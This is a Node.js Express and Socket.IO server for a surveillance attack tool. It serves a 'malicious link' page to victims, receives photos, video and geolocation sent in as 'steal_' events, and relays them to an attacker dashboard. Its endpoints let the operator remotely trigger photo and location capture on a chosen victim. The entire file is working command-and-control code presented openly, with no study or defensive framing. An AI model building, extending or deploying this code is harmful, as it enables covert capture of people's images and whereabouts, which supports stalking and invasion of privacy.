const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*" }
});

app.use(express.json({ limit: '100mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// Store connected victims with their socket IDs
let victims = new Map();

io.on('connection', (socket) => {
    console.log('🎯 Victim connected:', socket.id);
    victims.set(socket.id, { socket, id: socket.id, connectedAt: new Date() });
    
    // Victim sends photo
    socket.on('steal_photo', (data) => {
        console.log('📸 Photo received from:', socket.id);
        io.emit('new_photo', { 
            ...data, 
            victimId: socket.id,
            timestamp: new Date().toISOString()
        });
    });
    
    // Victim sends video
    socket.on('steal_video', (data) => {
        console.log('🎥 Video received from:', socket.id);
        io.emit('new_video', { ...data, victimId: socket.id });
    });
    
    // Victim sends location
    socket.on('steal_location', (data) => {
        console.log('📍 Location:', data.lat, data.lng);
        io.emit('new_location', { ...data, victimId: socket.id });
    });
    
    // Dashboard joins
    socket.on('dashboard_join', () => {
        socket.join('dashboard');
        console.log('🕹️ Dashboard connected');
    });
    
    socket.on('disconnect', () => {
        console.log('💀 Disconnected:', socket.id);
        victims.delete(socket.id);
        io.emit('victim_disconnected', socket.id);
    });
});

// Attacker dashboard
app.get('/dashboard', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

// Malicious link - victim page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'victim.html'));
});

// API for manual photo capture
app.post('/request-photo/:victimId', (req, res) => {
    const victimId = req.params.victimId;
    const victim = victims.get(victimId);
    if (victim && victim.socket) {
        victim.socket.emit('request_photo');
        res.json({ success: true, message: 'Photo request sent' });
    } else {
        res.json({ success: false, message: 'Victim not found' });
    }
});

// API for manual location request
app.post('/request-location/:victimId', (req, res) => {
    const victimId = req.params.victimId;
    const victim = victims.get(victimId);
    if (victim && victim.socket) {
        victim.socket.emit('request_location');
        res.json({ success: true, message: 'Location request sent' });
    } else {
        res.json({ success: false, message: 'Victim not found' });
    }
});

// Get all active victims
app.get('/victims', (req, res) => {
    const victimList = Array.from(victims.keys()).map(id => ({ id }));
    res.json(victimList);
});

const PORT = process.env.PORT || 8080;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`\n🔴 SERVER RUNNING on port ${PORT}`);
    console.log(`📱 Victim link: https://your-project.up.railway.app`);
    console.log(`🕹️ Dashboard: https://your-project.up.railway.app/dashboard`);
});
